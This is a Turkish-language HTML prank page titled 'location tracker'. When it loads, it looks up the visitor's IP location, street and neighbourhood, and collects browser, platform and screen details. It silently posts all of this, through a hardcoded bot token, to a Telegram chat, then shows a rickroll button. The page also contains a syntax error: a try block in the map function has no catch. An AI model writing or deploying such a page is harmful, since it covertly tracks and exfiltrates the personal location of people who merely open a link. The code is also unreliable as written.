<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Konum Takipçisi</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%;
      background: black;
      color: #00ff00;
      font-family: monospace, monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    #container {
      width: 95vw;
      max-width: 1200px;
      height: 95vh;
      background-color: black;
      border-radius: 8px;
      padding: 0;
      box-sizing: border-box;
      box-shadow: 0 0 20px #00ff00;
      display: flex;
      gap: 8px;
    }
    #terminal {
      flex: 1 1 50%;
      background: black;
      padding: 10px 15px;
      overflow-y: auto;
      font-size: 14px;
      line-height: 1.4;
      white-space: pre-wrap;
      user-select: none;
      border-radius: 8px;
      border: 1px solid #00ff00;
    }
    #map {
      flex: 1 1 50%;
      border: 2px solid #00ff00;
      border-radius: 8px;
      background: #111;
    }
    #rickrollButton {
      display: none;
      background: #00ff00;
      color: black;
      padding: 14px 35px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
      align-self: center;
      transition: background 0.3s ease;
      box-shadow: 0 0 15px #00ff00;
      margin: 8px auto;
    }
    #rickrollButton:hover {
      background: #00cc00;
      box-shadow: 0 0 25px #00ff00;
    }
    .leaflet-container {
      background: #111 !important;
    }
    .leaflet-popup-content-wrapper {
      background: #222 !important;
      color: #00ff00 !important;
    }
    .leaflet-popup-tip {
      background: #222 !important;
    }
  </style>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
  />
</head>
<body>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
  </div>
  <button id="rickrollButton">Sürpriz İçin Tıkla</button>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const button = document.getElementById('rickrollButton');
    let map;

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getCurrentTime() {
      return new Date().toLocaleString('tr-TR');
    }

    function decToDMS(deg) {
      const absolute = Math.abs(deg);
      const degrees = Math.floor(absolute);
      const minutes = ((absolute - degrees) * 60).toFixed(1);
      return {degrees, minutes};
    }

    function formatCoordinate(lat, lon) {
      const latDMS = decToDMS(lat);
      const lonDMS = decToDMS(lon);
      const latCardinal = lat >= 0 ? "Kuzey" : "Güney";
      const lonCardinal = lon >= 0 ? "Doğu" : "Batı";

      return `${latDMS.degrees}°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}°${lonDMS.minutes}' ${lonCardinal}`;
    }

    async function getLocationData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        if (data.error) throw new Error('IP tabanlı konum alınamadı');

        return {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || 'Bilinmiyor',
          region: data.region || 'Bilinmiyor',
          country: data.country_name || 'Bilinmiyor',
          ip: data.ip || 'Bilinmiyor',
          org: data.org || 'Bilinmiyor',
          postal: data.postal || 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      } catch {
        return {
          latitude: 41.0082,
          longitude: 28.9784,
          city: 'İstanbul',
          region: 'İstanbul',
          country: 'Türkiye',
          ip: 'Tespit edilemedi',
          org: 'Bilinmiyor',
          postal: 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      }
    }

    async function reverseGeocode(lat, lon) {
      try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
        const response = await fetch(url, {headers: {'User-Agent': 'KonumTakipci/1.0'}});
        const data = await response.json();

        const addr = data.address || {};
        return {
          street: addr.road || '',
          neighborhood: addr.suburb || addr.neighbourhood || '',
          city: addr.city || addr.town || addr.village || '',
          region: addr.state || '',
          country: addr.country || ''
        };
      } catch {
        return {street: '', neighborhood: '', city: '', region: '', country: ''};
      }
    }

    // Telegram mesaj gönderme fonksiyonu (bot token ve chat id buraya)
    function sendTelegramMessage(message) {
      const chatId = '640073750';
      const botToken = '78059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Telegram mesajı gönderildi.');
        } else {
          console.error('Telegram mesaj gönderilemedi:', data);
        }
      })
      .catch(error => console.error('Telegram API hatası:', error));
    }

    async function collectData() {
      logToTerminal(`[${getCurrentTime()}] Sistem başlatılıyor...`);
      let locationData = await getLocationData();

      // Reverse geocode ile mahalle, sokak bilgisi alma
      const reverse = await reverseGeocode(locationData.latitude, locationData.longitude);
      locationData.street = reverse.street || locationData.street;
      locationData.neighborhood = reverse.neighborhood || locationData.neighborhood;
      locationData.city = reverse.city || locationData.city;
      locationData.region = reverse.region || locationData.region;
      locationData.country = reverse.country || locationData.country;

      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);

      let infoMessage = 
        `Konum Bilgileri:\n` +
        `IP: ${locationData.ip}\n` +
        `Şehir: ${locationData.city}\n` +
        `Bölge: ${locationData.region}\n` +
        `Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
        `Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
        `Posta Kodu: ${locationData.postal}\n` +
        `Ülke: ${locationData.country}\n` +
        `ISP: ${locationData.org}\n` +
        `Koordinatlar: ${coordsFormatted}\n\n` +

        `Tarayıcı Bilgileri:\n` +
        `User Agent: ${navigator.userAgent}\n` +
        `Dil: ${navigator.language}\n` +
        `Platform: ${navigator.platform}\n` +
        `Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
        `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +

        `Ekran Bilgileri:\n` +
        `Çözünürlük: ${screen.width}x${screen.height}\n` +
        `Renk Derinliği: ${screen.colorDepth}\n` +
        `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
        `Şu anki Saat: ${getCurrentTime()}`;

      logToTerminal(infoMessage);

      sendTelegramMessage(infoMessage);

      showMap(locationData.latitude, locationData.longitude, locationData);

      logToTerminal(`[${getCurrentTime()}] Sistem hazır!`);
      addButton();
    }

    function showMap(lat, lon, locationData) {
      try {
        document.getElementById('map').innerHTML = '';
        map = L.map('map').setView([lat, lon], 16);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          maxZoom: 19,
          attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        const popupContent =
          `<b>Konum:</b> ${locationData.city}, ${locationData.region}<br>` +
          `<b>Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>` +
          `<b>Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>` +
          `<b>Koordinatlar:</b> ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;

        const marker = L.marker([lat, lon]).addTo(map);
        marker.bindPopup(popupContent).openPopup();
    }

    function addButton() {
      button.style.display = 'block';
      button.onclick = () => {
        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
      };
    }

    collectData();
  </script>
</body>
</html>
